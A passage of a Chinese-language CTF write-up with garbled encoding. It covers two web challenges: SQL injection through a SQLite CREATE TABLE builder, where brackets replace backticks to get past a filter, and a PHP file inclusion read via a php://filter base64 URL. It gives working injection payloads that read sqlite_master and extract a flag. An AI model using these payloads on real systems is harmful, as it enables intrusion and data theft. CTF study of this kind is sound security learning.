<span class="token delimiter">&lt;?php</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token markup">&lt; count($cName); $i++) { ?></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>values[]<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Insert values<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token delimiter">?></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span></span>å»ºè¡¨<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>?page<span class="token punctuation">=</span>build<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>info<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span><span class="token punctuation">></span></span></span>è¡¨å <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>table_name<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>table_name<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>è¾“å…¥è¡¨å<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span><span class="token punctuation">></span></span></span>åˆ—æ•° <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>number<span class="token punctuation">"</span></span> <span class="token attr-name">min</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">max</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>num<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>next<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>Next<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>table<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">></span></span></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>Name<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>Type<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>example1<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token constant">TEXT</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>example2<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token constant">TEXT</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Create table<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>
    $<span class="token punctuation">(</span><span class="token string">'#next'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
      let num <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>$<span class="token punctuation">(</span><span class="token string">'#num'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      let len <span class="token operator">=</span> $<span class="token punctuation">(</span><span class="token string">'#table_name'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>

      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">&lt;=</span> len <span class="token operator">&amp;&amp;</span> len <span class="token operator">&lt;=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token number">0</span> <span class="token operator">&lt;</span> num <span class="token operator">&amp;&amp;</span> num <span class="token operator">&lt;=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        $<span class="token punctuation">(</span><span class="token string">'#info'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addClass</span><span class="token punctuation">(</span><span class="token string">'hidden'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        $<span class="token punctuation">(</span><span class="token string">'#table'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">removeClass</span><span class="token punctuation">(</span><span class="token string">'hidden'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span>let i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> num<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          $<span class="token punctuation">(</span><span class="token string">'#table table'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>$<span class="token punctuation">(</span>`
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>columns[${i}][name]<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>
              <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>columns[${i}][type]<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>INTEGER<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token constant">INTEGER</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span></span>
                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>REAL<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token constant">REAL</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span></span>
                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>TEXT<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token constant">TEXT</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span></span>
              <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>`<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>

      <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span></code></pre>
<p>æœ‰äº†æºç ï¼Œé€»è¾‘å°±æ¸…æ™°äº†è®¸å¤šï¼Œæºç ä¸­æœ‰flagè¡¨åˆ›å»ºå’Œæ’å…¥flagçš„æ“ä½œï¼Œå¯ä»¥ç¡®å®šflagå­˜åœ¨äºæ•°æ®åº“ä¸­ï¼Œä½†æ˜¯å¯¹äºè¡¨åå’Œflagå€¼éƒ½æ˜¯åœ¨å¼€å§‹åŒ…å«è¿›æ¥çš„config.phpé‡Œå®šä¹‰çš„ã€‚</p>
<p>åœ¨æºç ä¸­çš„åˆ›å»ºè¡¨ç›¸å…³ä»£ç å¯ä»¥å‘ç°ï¼Œåˆ›å»ºè¡¨æ—¶è¡¨åï¼Œåˆ—åï¼Œåˆ—ç±»å‹å¯èƒ½å­˜åœ¨SQLæ³¨å…¥ï¼š</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"CREATE TABLE {$tName} ("</span><span class="token punctuation">;</span>
  <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"example1 TEXT, example2 TEXT"</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$column</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$type</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$column</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'åˆ—ä¸åˆæ³•'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$column</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token number">32</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$column</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token number">32</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'åˆ—ä¸åˆæ³•'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">', '</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"`$column` $type"</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">');'</span><span class="token punctuation">;</span>

  <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'CREATE TABLE `'</span> <span class="token punctuation">.</span> tableName <span class="token punctuation">.</span> <span class="token string">'` (`'</span> <span class="token punctuation">.</span> columnName <span class="token punctuation">.</span> <span class="token string">'` TEXT);'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'INSERT INTO `'</span> <span class="token punctuation">.</span> tableName <span class="token punctuation">.</span> <span class="token string">'` VALUES ("'</span> <span class="token punctuation">.</span> ans <span class="token punctuation">.</span> <span class="token string">'");'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>çœ‹ä¸€ä¸‹æœ€ç»ˆæ‹¼æ¥åçš„sqlè¯­å¥ï¼š</p>
<pre class=" language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> {$tName} <span class="token punctuation">(</span>example1 <span class="token keyword">TEXT</span><span class="token punctuation">,</span> example2 <span class="token keyword">TEXT</span><span class="token punctuation">,</span> <span class="token punctuation">`</span>$<span class="token keyword">column</span><span class="token punctuation">`</span> $<span class="token keyword">type</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>å‚æ•°éƒ½æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œtypeé‚£é‡Œè™½ç„¶æ˜¯ä¸ªä¸‹æ‹‰é€‰æ‹©ï¼Œä½†æ˜¯ç›´æ¥F12å°±å¯ä»¥æ›´æ”¹ï¼Œä¹Ÿæ˜¯å¯æ§çš„ã€‚</p>
<blockquote>
<p>sqlite_masterè¡¨æ˜¯SQLiteçš„ç³»ç»Ÿè¡¨ã€‚è¯¥è¡¨è®°å½•è¯¥æ•°æ®åº“ä¸­ä¿å­˜çš„è¡¨ã€ç´¢å¼•ã€è§†å›¾ã€å’Œè§¦å‘å™¨ä¿¡æ¯ã€‚æ¯ä¸€è¡Œè®°å½•ä¸€ä¸ªé¡¹ç›®ã€‚åœ¨åˆ›å»ºä¸€ä¸ªSQLIteæ•°æ®åº“çš„æ—¶å€™ï¼Œè¯¥è¡¨ä¼šè‡ªåŠ¨åˆ›å»ºã€‚sqlite_masterè¡¨åŒ…å«5åˆ—ã€‚</p>
<ul>
<li><p>typeåˆ—è®°å½•äº†é¡¹ç›®çš„ç±»å‹ï¼Œå¦‚tableã€indexã€viewã€triggerã€‚</p>
</li>
<li><p>nameåˆ—è®°å½•äº†é¡¹ç›®çš„åç§°ï¼Œå¦‚è¡¨åã€ç´¢å¼•åç­‰ã€‚</p>
</li>
<li><p>tbl_nameåˆ—è®°å½•æ‰€ä»å±çš„è¡¨åï¼Œå¦‚ç´¢å¼•æ‰€åœ¨çš„è¡¨åã€‚å¯¹äºè¡¨æ¥è¯´ï¼Œè¯¥åˆ—å°±æ˜¯è¡¨åæœ¬èº«ã€‚</p>
</li>
<li><p>rootpageåˆ—è®°å½•é¡¹ç›®åœ¨æ•°æ®åº“é¡µä¸­å­˜å‚¨çš„ç¼–å·ã€‚å¯¹äºè§†å›¾å’Œè§¦å‘å™¨ï¼Œè¯¥åˆ—å€¼ä¸º0æˆ–è€…NULLã€‚</p>
</li>
<li><p>sqlåˆ—è®°å½•åˆ›å»ºè¯¥é¡¹ç›®çš„SQLè¯­å¥ã€‚</p>
</li>
</ul>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91wp/16036081405146.jpg" alt=""></p>
</blockquote>
<p>é‚£æˆ‘ä»¬åªæœ‰åªè¦æƒ³åŠæ³•æŸ¥sqlite_masterè¡¨å°±çŸ¥é“flagè¡¨å’Œå¯¹åº”çš„å­—æ®µåã€‚ç»“åˆä¸Šé¢çš„sqlè¯­å¥ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ç§æ–¹å¼ï¼š</p>
<pre><code>create table aa as select xxx from xxx</code></pre><p>åŒæ—¶å‚æ•°è¿˜ç»è¿‡äº†filterå‡½æ•°çš„å¤„ç†ï¼Œè¢«æ£€æµ‹åˆ°å°±æ˜¾ç¤ºè¡¨åéæ³•ã€‚</p>
<p>é‚£ä¹ˆé€šè¿‡è¡¨åï¼Œåˆ—åå’Œç±»å‹ä¸‰ä¸ªåœ°æ–¹ä¼ å…¥payloadï¼Œæ¥æ‹¼æ¥å‡ºæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„è¯­å¥ã€‚</p>
<p>ä½†æ˜¯å‘ç°åœ¨tbnameåè¿˜æ‹¼æ¥äº†ä¸€äº›å†…å®¹ä¼šé€ æˆå¹²æ‰°ï¼Œè¿™é‡Œå¯ä»¥é€šè¿‡ åå¼•å· æŠŠå®ƒåŒ…è£¹èµ·æ¥ï¼Œå› ä¸ºåŒ…è£¹èµ·æ¥çš„å†…å®¹å°±æˆä¸ºäº†å…³é”®å­—ï¼Œå°±ç›¸</p>
<p>äº <code>select xx as key</code>,çœ‹ä¸€ä¸‹è¿™ä¸ªä¾‹å­ï¼š</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91wp/16036088629436.jpg" alt=""></p>
<p>åŒæ—¶åå¼•å·å¯ä»¥ä½¿ç”¨<code>[]</code>æ¥æ›¿ä»£ç»•è¿‡è¿‡æ»¤ã€‚</p>
<p>payload1:</p>
<pre><code>åœ¨åˆ›å»ºè¡¨æ—¶ï¼Œè¡¨å: t AS SELECT sql [
åˆ—å: abc
åˆ—ç±»å‹: ] FROM sqlite_master;</code></pre><p>è¿™æ—¶çš„sqlè¯­å¥å°±æ˜¯ï¼š</p>
<pre class=" language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> t <span class="token keyword">AS</span> <span class="token keyword">SELECT</span> sql <span class="token punctuation">[</span> <span class="token punctuation">(</span>example1 <span class="token keyword">TEXT</span><span class="token punctuation">,</span> example2 <span class="token keyword">TEXT</span><span class="token punctuation">,</span> <span class="token number">abc</span> <span class="token punctuation">]</span> <span class="token keyword">FROM</span> sqlite_master<span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>ç­‰ä»·äº</p>
<pre class=" language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> t <span class="token keyword">AS</span> <span class="token keyword">SELECT</span> sql <span class="token keyword">FROM</span> sqlite_master<span class="token punctuation">;</span></code></pre>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91wp/16036091121226.jpg" alt=""></p>
<p>å¾—åˆ°äº†è¡¨åå’Œåˆ—åï¼Œæ›¿æ¢è¯­å¥ä¸­çš„sqlå’Œsqlite_master å³å¯è·å¾—flagï¼š</p>
<p>payload2:</p>
<pre><code>t AS SELECT flag_ThE_C0lumn [
abc
]FROM flag_Y0U_c4nt_GUESS;</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91wp/16036091570801.jpg" alt=""></p>
<h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>å­˜åœ¨æ–‡ä»¶åŒ…å«</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91wp/16035214379499.jpg" alt=""></p>
<p>è¯»æºç ï¼š<br><a href="http://eci-2zegudi3pf4hpiupmwnp.cloudeci1.ichunqiu.com/index.php?page=php://filter/read=convert.base64-encode/resource=index.php" target="_blank" rel="noopener">http://eci-2zegudi3pf4hpiupmwnp.cloudeci1.ichunqiu.com/index.php?page=php://filter/read=convert.base64-encode/resource=index.php</a></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$page</span> <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string">'main.html'</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'location:index.php?page=main.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">// You may want to see 7fa3b767c460b54a2be4d49030b349c7.php</span>
<span class="token delimiter">?></span>
<span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span>
